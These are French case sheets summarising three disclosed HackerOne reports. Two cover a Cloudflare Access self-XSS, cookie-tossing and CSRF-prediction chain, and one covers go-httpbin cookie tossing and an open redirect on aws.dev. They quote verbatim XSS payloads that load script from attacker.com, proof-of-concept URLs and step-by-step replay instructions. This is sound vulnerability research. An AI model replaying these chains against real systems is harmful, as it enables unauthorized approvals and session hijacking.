# Fiches SSS — Cookie Injection / Supercookies

*3 cas sélectionnés dans le corpus 2025-2026. Preuves verbatim extraites des fichiers bruts `tools/collector/data/raw/h1/<id>.json` (texte intégral HackerOne, ou résumés d'équipe/chercheur quand le texte intégral est absent) et, pour les rapports Cloudflare #3423950 / #3321406, du writeup complet du chercheur intégré au corpus : `tools/collector/data/raw/pages/kazama/cloudflare-self-xss.txt`.*

---

### [Variation of #3321406] Self-XSS + Cookie Tossing → auto approval in AccessTempAuth

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3423950)

⚠️ `vulnerability_information` vide dans `data/raw/h1/3423950.json` — fiche fondée sur les résumés du JSON brut **et le writeup du chercheur** (`data/raw/pages/kazama/cloudflare-self-xss.txt`).

Après correction du Self-XSS SAML (#3321406), second Self-XSS — cette fois **stocké** — dans le champ email de Browser Isolation, enchaîné jusqu'à l'auto-approbation d'une demande Temporary Auth en un clic. Corrigé le 6 janvier 2026, bounty 2 000 $.

**Cause racine :** les endpoints `*.cloudflareaccess.com/browser` rendent le claim `email` du JWT `CF_Authorization` sans assainissement dans une balise `<script>` inline (`var userEmail = '<injection>'`) : fermeture du littéral → injection de JS. Deux verrous contournés : validation d'email (quoted-string RFC 5321) et minuscules imposées par `/browser` (payload en 3 stages). Fin de chaîne identique à #3321406 : cookie tossing `CF_Session` + `csrf_token` déterministe → POST d'auto-approbation.

**Preuve technique (verbatim) :**

Résumés du JSON brut H1 :

```
We have resolved an issue in Cloudflare Access where an exploit chain involving the Browser Isolation email field could allow for unauthorized approvals within the Temporary Auth workflow. This has been fully remediated, and we thank the researcher for their help in hardening our authentication flows

Detailed Writeup: https://kazama.in/self-xss-to-cloudflare-single-click-approvals/
```

Writeup du chercheur (source intégrée) :

```
Some of these endpoints pull the user's email directly from the CF_Authorization cookie's JWT email claim – and render it without sanitization. The email was injected inside an inline <script> tag, something like:
var userEmail = '<injection>'
There was one problem: the /browser endpoint lowercases email addresses before rendering them.
This is a Stored Self-XSS: the payload persists in the CF_Authorization Cookie and fires every time the authenticated session loads the Browser Isolation page.
there was an additional hurdle: Cloudflare's email field had format validation that rejected obviously malformed email addresses. I dug into the email RFCs and found that the quoted-string feature allows almost any character inside the local part when wrapped in double quotes.
```

Payload final et URL d'atterrissage (verbatim) :

```
"test'</script><script>eval(unescape(window.location.search.split('=')[0].slice(1)))</script>"@burp-collab-domain.com
https://attackerdomain.cloudflareaccess.com/browser/https://example.com/?document.head.appendChild(Object.assign(document.createElement("script"),{src:"https://attacker.com/js"}))
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : org Zero Trust de l'attaquant ; domaine Collaborator réceptionnant l'OTP ; demande Temporary Auth en attente ; approbateur qui clique.
- Étapes (chaîne du writeup) : 1. Compte avec l'email payload quoted-string (domaine Collaborator = MTA réel → OTP livré). 2. Émettre la demande Temporary Auth. 3. Réclamer un OTP, capter le magic link. 4. Lien de phishing = magic link + Stage 2 en **clé** de query. 5. Clic victime → OTP → `CF_Authorization` posé sur `attackerdomain` (session `victimdomain` intacte). 6. `/browser` rend l'email → Stage 1 `eval(unescape(…))` lit la clé de query (non minusculee) → Stage 2 injecte `<script src="https://attacker.com/js">` → Stage 3 : cookie tossing + POST avec `csrf_token` pré-calculé. 7. Demande approuvée avant réaction.
- Pièges / limites : `/browser` minuscule tout → Stage 1 lowercase (d'où `eval(unescape(…))`) ; l'email doit passer la validation tout en embarquant le script ; Self-XSS **authentifié** → livraison OTP ; après le correctif SAML, seules les entrées XSS ont changé — cookie tossing et CSRF déterministe sont restés.

**Reproductibilité :** moyenne — payloads et URL exacts dans le writeup intégré, mais cible corrigée (janvier 2026) et clic d'un approbateur requis.

**Techniques :** stored self-xss, jwt email claim injection, rfc5321 quoted-string bypass, lowercase staging (eval/unescape), cookie tossing, anti-csrf token prediction, otp magic link delivery, 1-click chain, unauthorized approval

**Correspond aux classes qualifiantes :** xss, csrf, cookie injection, auth bypass

**Signal (endpoints/fonctions observés) :**
- `*.cloudflareaccess.com/browser/…` (claim `email` rendu), `…/cdn-cgi/access/authorized?nonce=&code=&secret=` (OTP), `…/access-request/*` (POST d'approbation)
- Cookies `CF_Authorization` (JWT claim `email`), `CF_Session` (portée `*.cloudflareaccess.com`) ; Stage 1 `eval(unescape(…))`, Stage 2 `https://attacker.com/js`

**Paramètres impliqués :** claim `email` du JWT, `CF_Session`, `csrf_token`, clé de query (Stage 2), `nonce`, `code`, `secret` (OTP)

---

### [Variation of #1554049] Self-XSS + Cookie Tossing → auto approval in Access Temp Auth

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3321406)

⚠️ `vulnerability_information` vide dans `data/raw/h1/3321406.json` — fiche fondée sur les résumés du JSON brut **et le writeup complet du chercheur, intégré au corpus** (`data/raw/pages/kazama/cloudflare-self-xss.txt`).

Rapport fondateur de la chaîne (soumis le 31 août 2025, corrigé le 11 novembre 2025, bounty 1 000 $) : trois bugs « informative » — Self-XSS, cookie tossing, AntiCSRF prédictible — enchaînés en auto-approbation en un clic du Temporary Auth.

**Cause racine :** 1) l'ACS URL de config SAML accepte les protocoles non-HTTP : un `javascript:` URI devient l'`action` d'un formulaire auto-soumis par l'endpoint SSO → JS sur `*.cloudflareaccess.com` (Self-XSS authentifié). 2) `CF_Session`, cookie anti-CSRF scopé `*.cloudflareaccess.com`, se laisse fixer depuis un sous-domaine frère. 3) `csrf_token` « fixed and static, derived directly from the CF_Session cookie value » : cookie connu ⇒ jeton connu.

**Preuve technique (verbatim) :**

Résumés du JSON brut H1 :

```
We have resolved an issue in Cloudflare Access where an exploit chain involving a SAML endpoint could allow for unauthorized approvals within the Temporary Auth workflow. This has been fully remediated, and we thank the researcher for their help in hardening our authentication flows

Detailed Writeup: https://kazama.in/self-xss-to-cloudflare-single-click-approvals/
```

Writeup du chercheur (source intégrée) :

```
The problem was twofold. First, while registering the SAML app in Cloudflare's dashboard, the ACS URL field accepted non-HTTP protocols – a javascript: URI was happily saved without any validation. Second, when the SSO endpoint at attackerdomain.cloudflareaccess.com/cdn-cgi/access/sso/saml was hit, it rendered an auto-submitting POST form with this ACS URL as the form action.
By setting CF_Session=ZeroTrustIsFun! (or any known value) from the attacker's subdomain, the cookie gets sent on every *.cloudflareaccess.com/access-request/* request, including the victim's approval endpoints.
However, if the cookie value is known, the CSRF token is known. It's entirely deterministic.
The magic link follows a redirect chain through attackerdomain.cloudflareaccess.com/cdn-cgi/access/authorized?nonce=&code=&secret= that sets the CF_Authorization cookie, effectively authenticating the browser session without any user interaction beyond the initial click.
Since CF_Session is now a known value set on victim's browser and the CSRF token is just a hash derived from it, I had already pre-computed the matching csrf_token from my own account beforehand – no guessing needed
Sends a cross-origin POST request from attackerdomain.cloudflareaccess.com to victimdomain.cloudflareaccess.com/access-request/* with the pre-computed CSRF token.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : org Zero Trust de l'attaquant ; hébergement de `https://attacker.com/js` ; sous-domaine `cloudflareaccess.com` pour le phishing ; approbateur qui clique.
- Étapes (chaîne du writeup) : 1. app SAML avec ACS URL = `javascript:document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://attacker.com/js'}))`. 2. Vérifier le formulaire auto-soumis sur `…/cdn-cgi/access/sso/saml` (`CF_Authorization` requis). 3. Pré-calculer le `csrf_token` de `CF_Session=ZeroTrustIsFun!`. 4. Magic link OTP dans le lien de phishing. 5. Clic victime → OTP → `CF_Authorization` posé **uniquement** sur `attackerdomain` (session `victimdomain` préservée) → payload JS. 6. Cookie tossing `CF_Session=ZeroTrustIsFun!` sur tous les frères. 7. POST vers `victimdomain.cloudflareaccess.com/access-request/*` avec le jeton pré-calculé → auto-approbation.
- Pièges / limites : Self-XSS authentifié (livraison OTP, un seul clic) ; `CF_Session` absent est aléatoire à chaque chargement → tossing indispensable ; « the approver can try to cancel the request afterwards, but it's too late » ; pris isolément, ces trois bugs « would get closed as informative » — l'enchaînement fait la sévérité (rapport fixed, 1 000 $).

**Reproductibilité :** moyenne — payloads et étapes exacts dans le writeup intégré, mais cible corrigée (novembre 2025) et clic d'un approbateur requis.

**Techniques :** self-xss via javascript: uri in saml acs url, cookie tossing cf_session, anti-csrf token prediction, otp magic link delivery, 1-click chain, unauthorized approval

**Correspond aux classes qualifiantes :** xss, csrf, cookie injection, auth bypass

**Signal (endpoints/fonctions observés) :**
- `attackerdomain.cloudflareaccess.com/cdn-cgi/access/sso/saml` (SSO auto-soumis, `action` = ACS URL), `…/cdn-cgi/access/authorized?nonce=&code=&secret=` (OTP), `*.cloudflareaccess.com/access-request/*` (approbation)
- Cookies `CF_Authorization` (scopé sous-domaine), `CF_Session` ; paramètre `csrf_token`

**Paramètres impliqués :** ACS URL (payload `javascript:`), `CF_Session`, `csrf_token`, `nonce`, `code`, `secret` (OTP)

---

### Unauthenticated go-httpbin servers: Cookie Tossing on *.aws.dev and Open Redirect

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3966599)

Des instances go-httpbin non authentifiées exposent des endpoints qui acceptent des entrées attaquantes sans validation : `/cookies/set` permet de poser un cookie avec un `Domain` arbitraire, dont le domaine parent `aws.dev`, et `/redirect-to` redirige vers n'importe quelle URL. Des cookies contrôlés par l'attaquant, posés depuis un hôte `*.aws.dev`, sont ainsi envoyés à des applications sœurs sans rapport (cookie tossing), avec un impact DoS constaté : une valeur de cookie forgée déclenche un 403 CloudFront/WAF pour une application distincte. Risques complémentaires : cookie shadowing des cookies applicatifs ou de sécurité, et open redirect depuis une URL de confiance `aws.dev`.

**Cause racine :** une instance go-httpbin non authentifiée est joignable sur un hôte `*.aws.dev` (hôtes masqués `████████` dans la source) ; ses endpoints permettent par conception de définir un cookie avec un `Domain` arbitraire — y compris le domaine parent partagé `aws.dev` — et de rediriger vers une URL arbitraire, sans restriction. C'est ce `Domain` parent qui propage le cookie à toutes les applications sœurs.

**Preuve technique (verbatim depuis la source) :**

```
$ curl -s ████████redirect-to?url=http://google.com -D - -o /dev/null
HTTP/1.1 302 Found
…
Location: http://google.com

████████cookies/set?dos_poc=<script>alert(1)</script>&attr[Domain]=aws.dev

3. As impact, observe the cookie set by `████████` on `aws.dev`, triggers a WAF denial (on a single user) on `████████`
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte ; identifier une instance go-httpbin non authentifiée sur un hôte `*.aws.dev` (tous les hôtes sont masqués `████████` dans la source) ; un navigateur pour le cookie tossing.
- Étapes : 1. Naviguer vers l'application visée pour observer son comportement normal (401 avec invite de login). 2. Charger l'URL vulnérable `/cookies/set?dos_poc=<script>alert(1)</script>&attr[Domain]=aws.dev` pour poser le cookie `dos_poc` sur le domaine `aws.dev`. 3. Constater qu'une application sœur sur `*.aws.dev` reçoit le cookie et renvoie un refus WAF. 4. Open redirect : `curl -s .../redirect-to?url=http://google.com -D - -o /dev/null` → `HTTP/1.1 302 Found` et `Location: http://google.com`.
- Pièges / limites : l'hôte vulnérable est masqué ; le DoS observé est « on a single user » ; le cookie de démonstration a une valeur type XSS mais l'impact démontré est le blocage WAF, pas une exécution de script.

**Reproductibilité :** moyenne — endpoints et payloads exacts fournis, aucun compte requis, mais l'hôte vulnérable est masqué dans la source.

**Techniques :** cross-subdomain cookie tossing, cookie injection via httpbin, parent domain cookie, open redirect, waf denial of service, cookie shadowing

**Correspond aux classes qualifiantes :** open redirect, cookie injection, dos

**Signal (endpoints/fonctions observés) :**
- `GET /cookies/set?…&attr[Domain]=aws.dev`
- `GET /redirect-to?url=…`
- Instance go-httpbin non authentifiée sur `*.aws.dev`

**Paramètres impliqués :** `dos_poc`, `attr[Domain]`, `url`
